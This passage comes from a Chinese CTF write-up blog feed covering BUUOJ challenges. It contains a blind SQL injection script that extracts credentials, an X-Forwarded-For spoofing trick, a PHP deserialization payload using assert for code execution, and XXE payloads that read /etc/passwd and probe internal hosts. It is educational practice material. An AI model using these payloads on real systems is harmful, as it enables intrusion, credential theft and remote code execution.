= "http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),&#123;0&#125;,1))&lt;&#123;1&#125;)".format(i, mid)</span>        <span class="token comment"># url = "http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(username,':',password))from(F1nal1y)),&#123;0&#125;,1))&lt;&#123;1&#125;)".format(i, mid)</span>       <span class="token comment"># url = "http://bdd094c1-1f95-40ae-a983-e0744076a014.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(username,':',password))from(F1naI1y)),&#123;0&#125;,1))&lt;&#123;1&#125;)".format(i, mid)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">)</span>        <span class="token comment"># print(r.text)</span>        <span class="token keyword">if</span> <span class="token string">'Click others'</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>           <span class="token comment"># 布尔判断成立的时候的情况</span>            begin <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>            mid <span class="token operator">=</span> <span class="token punctuation">(</span>begin <span class="token operator">+</span> end<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            end <span class="token operator">=</span> mid            mid <span class="token operator">=</span> <span class="token punctuation">(</span>begin <span class="token operator">+</span> end<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>     <span class="token comment"># 退出使的判断会多做一次，导致mid比实际的要大1</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>    i <span class="token operator">+=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行脚本爆出数据库为geek</p><p>爆出表名有F1naI1y,Flaaaaag</p><p>Flaaaaag内的字段有id,fl4gawsl</p><p>flag没有在fl4gawsl中。</p><p>F1naI1y中有字段 id,username,password</p><p>查看用户密码</p><p>在password中的最后一个可以爆出flag</p><h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p><strong>考点：XXF、签到题</strong></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token operator">&lt;</span>script<span class="token operator">></span>    <span class="token keyword">function</span> <span class="token function">enc</span><span class="token punctuation">(</span><span class="token parameter">code</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      hash <span class="token operator">=</span> <span class="token function">hex_md5</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> hash<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token keyword">var</span> code <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"vcode"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>code <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hex_md5</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"0cd4da0223c0b280829dc3ea458d655c"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"您通过了验证！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          window<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token string">"./flag.php"</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>          <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"你的授权码不正确！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"请输入授权码"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>          <span class="token punctuation">&#125;</span>  <span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接去访问flag.php，提示</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">我已经把购买者的IP保存了，显然你没有购买验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>所以尝试添加一个http头xxf试试，直接获得flag</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210131184223167.png" alt="image-20210131184223167"></p><h2 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h2><p><strong>考点：PHP反序列化</strong></p><p>查看源码，发现./time.php?source，访问看看，得到源码。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">#error_reporting(0);</span><span class="token keyword">class</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$a</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$b</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Y-m-d h:i:s"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"date"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">a</span><span class="token punctuation">;</span>        <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HelloPhp</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'source'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>@<span class="token variable">$ppp</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看一下应该是要做反序列化，data是序列化字符传入点，在析构函数处存在一个字符串嵌套来实现函数执行的点，就是利用点了。</p><p>eval和system()函数都没有成功，但是可以使用assert()函数，断言函数是用于，*assert()<em>可以将整个字符串参数当作php参数执行，而类似的</em>eval()*函数是执行合法的php代码。</p><p>所以使用exp:</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php#error_reporting(0);class HelloPhp&#123;    public $a;    public $b;    public function __construct()&#123;        $this-&gt;a &#x3D; &quot;Y-m-d h:i:s&quot;;        $this-&gt;b &#x3D; &quot;date&quot;;    &#125;    public function __destruct()&#123;        $a &#x3D; $this-&gt;a;        $b &#x3D; $this-&gt;b;        echo $b($a);    &#125;&#125;$c &#x3D; new HelloPhp;$c-&gt;a &#x3D; &quot;phpinfo()&quot;;$c-&gt;b &#x3D; &quot;assert&quot;;$d &#x3D; serialize($c);var_dump($d);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload:</p><p><code>O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</code></p><h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>考点：xxe</p><p>burp抓包查看信息，发现了xml形式的账号密码格式，我们尝试进行xxe</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">alan</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>/flag是不存在的，那么现收集一下信息，passwd看完了，看一下hosts文件。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">alan</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "file:///etc/hosts"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>没有发现有用的ip地址，再看一下/proc/net/arp</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210131203036898.png" alt="image-20210131203036898"></p><p>可以发现10.99.142.2、和10.128.0.1两个IP地址。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">alan</span><span class="token punctuation">[</span><span class="token internal-subset">&lt;!ENTITY xxe SYSTEM "http://10.99.142.2/"></span><span class="token punctuation">]</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>user</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>username</span><span class="token punctuation">></span></span><span class="token entity named-entity" title="&xxe;">&amp;xxe;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>username</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>password</span><span class="token punctuation">></span></span>password<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>password</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>user</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>访问失败，显示连接被拒绝，使用burp的intruder去扫一下C段，看看存活主机。</p><p>找到了10.99.142.11是可以访问的，成功获取到flag。</p><p><img src="https://gitee.com/A1andNS/blogimage/raw/master/img/image-20210131203717131.png" alt="image-20210131203717131"></p><h2 id="Misc-ningen"><a href="#Misc-ningen" class="headerlink" title="[Misc]ningen"></a>[Misc]ningen</h2><p>binwalk分析图片，发现存在zip后，binwalk分离文件，然后使用压缩包爆破工具爆出密码，解压获取flag</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;BSidesCF-2020-Had-a-bad-day&quot;&gt;&lt;a href=&quot;#BSidesCF-2020-Had-a-bad-day&quot; class=&quot;headerlink&quot; title=&quot;[BSidesCF 2020]Had a bad day&quot;&gt;&lt;/a&gt;[BSi</summary>
      
    
    
    
    <category term="CTF" scheme="http://yoursite.com/categories/CTF/"/>
    
    
    <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
    <category term="BUUOJ" scheme="http://yoursite.com/tags/BUUOJ/"/>
    
  </entry>
  
</feed>
